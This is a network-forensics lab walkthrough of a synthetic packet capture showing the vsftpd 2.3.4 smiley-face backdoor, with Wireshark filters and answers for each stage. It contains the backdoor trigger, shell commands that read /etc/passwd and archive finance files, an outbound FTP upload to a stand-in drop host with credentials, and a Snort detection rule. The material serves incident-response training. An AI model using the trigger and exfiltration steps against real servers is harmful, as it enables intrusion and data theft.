Server-side compromise: the vsftpd backdoor

Chapter 10 of Bejtlich walks through this exact class of attack on a vulnerable FTP server. This capture is a fresh reconstruction with different addresses, so you can solve it before you read his answer. Use it to practice the investigation flow: alert, session, full content, scope.

Download and open

  • vsftpd-backdoor-exfil.pcap — 277 packets: recon, FTP trigger, a shell on port 6200, then an outbound FTP upload

All traffic is synthetic. Hosts use private or documentation addresses and domains end in .test or .example. Nothing in the file is real malware. The attack pattern follows Bejtlich Ch. 10 (and the public vsftpd 2.3.4 backdoor); the addresses, names and bytes are new.

01Find the recon.

ip.src == 198.51.100.23 && tcp.flags.syn == 1 && tcp.flags.ack == 0
Statistics > Conversations > TCP
Answer

One ICMP echo, then 30 SYNs to 30 different ports on 10.20.30.5 between 0.5 and 0.8 seconds. Closed ports answer RST,ACK; open ones answer SYN,ACK and are reset. This is Bejtlich's "phase" pattern: ping, scan, then talk to what answered. The scan includes port 6200, hold that thought.

02What happened on port 6200 during the scan?

tcp.port == 6200
Answer

The first SYN to 6200 (frame 78, at 0.8 seconds) gets RST,ACK. Nothing is listening. Remember it: this port must not be open at this point.

03Read the FTP login.

ftp
Right-click > Follow > TCP Stream on the port 21 session at 40.8 s
Answer

The banner is 220 (vsFTPd 2.3.4). The attacker sends USER anonymous:) and PASS x. The server never answers 230; the connection simply stops being interesting. A username ending in a smiley face is the trigger for a backdoor that was planted in the vsftpd 2.3.4 source in 2011 (CVE-2011-2523).

04Find the backdoor opening.

tcp.port == 6200 && tcp.flags.syn == 1
Answer

Frame 91 at 41.17 seconds, about 0.3 seconds after the USER command (frame 85): a new connection to 6200, this time SYN,ACK. The same port that was closed during the scan now answers. A port that starts listening right after a login attempt is the signature of this backdoor, and no signature for the exploit is needed to see it in session data.

05Read the shell.

tcp.port == 6200 && tcp.len > 0
Right-click > Follow > TCP Stream
Answer

No login, no prompt: id returns uid=0(root). Then uname -a, a directory listing of /srv/finance (budget, customers, payroll), the first lines of /etc/passwd, and tar czf /tmp/f.tgz /srv/finance. Cleartext, so a full-content sensor has the transcript. Bejtlich calls establishing this kind of channel a command-and-control channel (Breach 3 in his categories).

06Find the exfiltration.

ftp.request.command == "STOR"
Statistics > Conversations > TCP, sort by bytes
Answer

About 25 seconds later the server opens an outbound FTP session to 192.0.2.80: USER drop, PASS drop123, TYPE I, PASV (answer: port 40111), STOR f.tgz, then about 187 kB flows over the data connection. The file starts with the gzip bytes 1f 8b. The cleartext credentials belong to the attacker's drop server, which makes them evidence you can quote. Target's stolen data left over FTP too; see Case Study 2.

07Scope and detect.

Answer

Scope: which host (10.20.30.5), which files (/srv/finance), how much (about 187 kB, compressed), to where (192.0.2.80), by whom (198.51.100.23, maybe a proxy). Detect, from cheapest to hardest: any FTP leaving the network; a server initiating outbound connections it never made before; a new listening port after a login; the vsftpd smiley username (alert tcp any any -> $HOME_NET 21 (msg:"vsftpd 2.3.4 backdoor trigger"; flow:to_server,established; content:"USER "; content:":)"; distance:0; sid:1000401; rev:1;), a sketch to test). Prevent: patch, remove FTP, egress filtering.
